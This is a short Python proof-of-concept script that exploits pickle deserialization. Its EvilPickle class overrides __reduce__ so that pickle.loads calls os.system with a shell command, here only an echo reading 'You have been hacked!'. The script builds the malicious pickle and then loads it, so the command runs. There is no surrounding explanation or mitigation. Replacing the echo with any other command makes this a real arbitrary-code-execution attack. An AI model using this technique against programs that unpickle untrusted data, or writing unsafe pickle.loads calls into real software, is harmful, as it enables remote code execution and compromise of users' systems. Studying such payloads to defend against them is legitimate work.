import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_exploit():
    malicious = pickle.dumps(EvilPickle())
    return malicious

def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)

if __name__ == '__main__':
    exploit = serialize_exploit()
    deserialize_exploit(exploit)
